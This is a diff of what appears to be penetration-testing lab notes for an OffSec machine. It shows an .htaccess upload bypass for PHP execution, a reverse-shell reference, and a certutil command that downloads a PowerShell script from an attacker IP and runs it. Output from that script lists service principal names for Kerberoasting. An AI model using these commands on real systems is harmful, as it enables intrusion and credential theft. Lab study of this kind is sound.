@@ -950,8 +950,22 @@ echo "AddType application/x-httpd-php .dork" > .htaccess
 # https://www.revshells.com/
 php Ivan Sincek
 
-# 
+# privil
+cd C:\Users\Public
 certutil -urlcache -split -f http://192.168.45.192/Get-SPN.ps1
+./Get-SPN.ps1
+Object Name =  krbtgt
+DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
+Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
+servicePrincipalNames
+SPN( 1 )   =       kadmin/changepw
+
+Object Name =  MSSQL
+DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
+Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
+servicePrincipalNames
+SPN( 1 )   =       MSSQLSvc/DC.access.offsec
+
 
 ```
 
